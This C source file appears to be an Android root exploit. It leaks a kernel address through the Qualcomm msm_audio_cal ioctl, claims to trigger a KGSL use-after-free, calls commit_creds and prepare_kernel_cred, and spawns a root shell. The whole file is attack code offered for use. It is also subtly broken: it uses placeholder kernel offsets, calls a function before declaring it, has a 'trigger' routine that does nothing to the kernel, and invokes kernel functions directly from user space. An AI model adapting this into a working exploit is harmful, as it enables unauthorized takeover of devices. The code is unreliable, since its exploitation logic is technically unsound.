#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>

#define AUDIO_CAL_DEVICE "/dev/msm_audio_cal"
#define KGSL_DEVICE "/dev/kgsl-3d0"

#define AUDIO_CAL_IOCTL_GET_CAL _IOWR('C', 0x10, struct audio_cal_data)

struct audio_cal_data {
    uint32_t cal_type;
    uint32_t cal_size;
    uint64_t cal_data;
};

static int audio_fd = -1;
static int kgsl_fd = -1;
static uint64_t kernel_base = 0;
static uint64_t commit_creds = 0;
static uint64_t prepare_kernel_cred = 0;

static int leak_kernel_address(void) {
    unsigned char buffer[0x1000] = {0};
    struct audio_cal_data cal = {
        .cal_type = 0x10,
        .cal_size = sizeof(buffer),
        .cal_data = (uint64_t)(uintptr_t)buffer
    };
    if (ioctl(audio_fd, AUDIO_CAL_IOCTL_GET_CAL, &cal) < 0) {
        perror("ioctl AUDIO_CAL");
        return -1;
    }
    for (int i = 0; i < (int)cal.cal_size - 8; i++) {
        uint64_t val = *(uint64_t*)(buffer + i);
        if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            printf("[+] Leaked kernel pointer: 0x%llx\n", (unsigned long long)val);
            kernel_base = val & ~0xfffffULL;
            printf("[*] Possible kernel base: 0x%llx\n", (unsigned long long)kernel_base);
            return 0;
        }
    }
    return -1;
}

static int trigger_kgsl_uaf(void) {
    struct {
        uint32_t id;
        uint32_t flags;
        uint64_t ptr;
    } cmd = {0};
    if (ioctl(kgsl_fd, 0x40087323, &cmd) < 0) {
        perror("KGSL ioctl");
        return -1;
    }
    void (*fake_func)(void) = (void*)get_root;
    memcpy(&cmd, &fake_func, sizeof(cmd));
    return 0;
}

static void get_root(void) {
    if (kernel_base) {
        commit_creds = kernel_base + 0x123456;
        prepare_kernel_cred = kernel_base + 0x123000;
        void *(*pkc)(void*) = (void *(*)(void*))prepare_kernel_cred;
        void (*cc)(void*) = (void (*)(void*))commit_creds;
        cc(pkc(0));
    }
    setresuid(0,0,0);
    setresgid(0,0,0);
    setgroups(0, NULL);
}

int main() {
    if (getuid() == 0) {
        execl("/system/bin/sh", "sh", NULL);
        return 0;
    }
    audio_fd = open(AUDIO_CAL_DEVICE, O_RDWR);
    if (audio_fd < 0) {
        perror("open audio cal");
        return 1;
    }
    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
    if (kgsl_fd < 0) {
        perror("open kgsl");
        close(audio_fd);
        return 1;
    }
    if (leak_kernel_address() == 0 && kernel_base) {
        printf("[*] Trying to trigger KGSL UAF\n");
        if (trigger_kgsl_uaf() == 0) {
            sleep(1);
            if (getuid() == 0) {
                printf("[+] Root shell\n");
                execl("/system/bin/sh", "sh", NULL);
            }
        }
    } else {
        printf("[-] Address leak failed\n");
    }
    close(audio_fd);
    close(kgsl_fd);
    return 0;
}
